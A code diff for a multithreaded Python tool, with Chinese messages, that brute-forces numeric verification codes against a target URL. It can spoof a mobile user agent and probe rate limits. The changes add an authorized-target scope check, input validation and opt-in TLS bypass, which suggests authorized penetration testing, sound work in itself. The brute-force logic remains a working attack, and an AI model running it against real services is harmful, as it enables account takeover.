@@ -20,14 +20,22 @@ import argparse
 import sys
 import threading
 import time
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
+
+from scope_guard import require_allowed
+
+for _stream in (sys.stdout, sys.stderr):
+    try:
+        _stream.reconfigure(encoding="utf-8", errors="replace")
+    except (AttributeError, OSError):
+        pass
 
 try:
     import requests
     import urllib3
-    urllib3.disable_warnings()
 except Exception:
-    sys.exit("需要 requests：pip install requests")
+    requests = None
+    urllib3 = None
 
 UA = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
       "Accept": "application/json, text/plain, */*"}
@@ -53,8 +61,8 @@ def build(url, param_tpl, code, extra_headers):
     return url, data
 
 
-def attempt(sess_kwargs, url, data, timeout):
-    r = requests.post(url, data=data, headers=UA, timeout=timeout, **sess_kwargs)
+def attempt(sess_kwargs, url, data, headers, timeout):
+    r = requests.post(url, data=data, headers=headers, timeout=timeout, **sess_kwargs)
     return r.text[:400]
 
 
@@ -69,17 +77,33 @@ def main():
     ap.add_argument("--end", type=int, default=0, help="0 = 10^digits")
     ap.add_argument("--timeout", type=float, default=15)
     ap.add_argument("--probe-only", action="store_true", help="只跑 200 次限流探测")
-    ap.add_argument("--insecure", action="store_true", default=True)
+    ap.add_argument("--insecure", action="store_true", help="关闭 TLS 证书校验")
     ap.add_argument("--header", default="", help="额外头，k:v;k2:v2")
+    ap.add_argument("--scope-config", help="AUTHORIZED-TARGETS.json 路径")
     a = ap.parse_args()
+    if requests is None:
+        ap.error("需要 requests：python -m pip install -r requirements.txt")
+    try:
+        require_allowed(a.url, "exploit", a.scope_config)
+    except (ValueError, PermissionError) as exc:
+        ap.error("scope denied: %s" % exc)
 
     end = a.end or (10 ** a.digits)
-    sess_kwargs = {"verify": False}
+    if a.threads < 1 or a.threads > 512:
+        ap.error("--threads must be between 1 and 512")
+    if a.digits < 1 or a.digits > 12:
+        ap.error("--digits must be between 1 and 12")
+    if a.start < 0 or end <= a.start:
+        ap.error("invalid --start/--end range")
+    sess_kwargs = {"verify": not a.insecure}
+    if a.insecure and urllib3 is not None:
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    headers = dict(UA)
     if a.header:
         for kv in a.header.split(";"):
             if ":" in kv:
                 k, v = kv.split(":", 1)
-                UA[k.strip()] = v.strip()
+                headers[k.strip()] = v.strip()
 
     st = State()
     print("[+] 目标   : %s" % a.url)
@@ -91,9 +115,9 @@ def main():
         if st.stop:
             return
         code = str(i).zfill(a.digits)
-        url, data = build(a.url, a.param, code, UA)
+        url, data = build(a.url, a.param, code, headers)
         try:
-            body = attempt(sess_kwargs, url, data, a.timeout)
+            body = attempt(sess_kwargs, url, data, headers, a.timeout)
         except Exception as e:
             with st.lock:
                 st.seen["ERR:" + str(e)[:30]] = st.seen.get("ERR:" + str(e)[:30], 0) + 1
@@ -120,11 +144,27 @@ def main():
         print("[!] 限流探测模式：只打 200 次\n")
 
     t0 = time.time()
-    with ThreadPoolExecutor(max_workers=a.threads) as ex:
-        futs = [ex.submit(work, i) for i in range(a.start, end)]
-        for f in as_completed(futs):
-            if st.stop:
-                break
+    ex = ThreadPoolExecutor(max_workers=a.threads)
+    pending = set()
+    numbers = iter(range(a.start, end))
+    try:
+        for _ in range(min(a.threads * 2, end - a.start)):
+            pending.add(ex.submit(work, next(numbers)))
+        while pending and not st.stop:
+            done, pending = wait(pending, return_when=FIRST_COMPLETED)
+            for future in done:
+                future.result()
+                if st.stop:
+                    break
+                try:
+                    value = next(numbers)
+                except StopIteration:
+                    continue
+                pending.add(ex.submit(work, value))
+    finally:
+        for future in pending:
+            future.cancel()
+        ex.shutdown(wait=True, cancel_futures=True)
     el = time.time() - t0
     print("\n=== 结果 ===")
     print("  完成  : %d" % st.done)
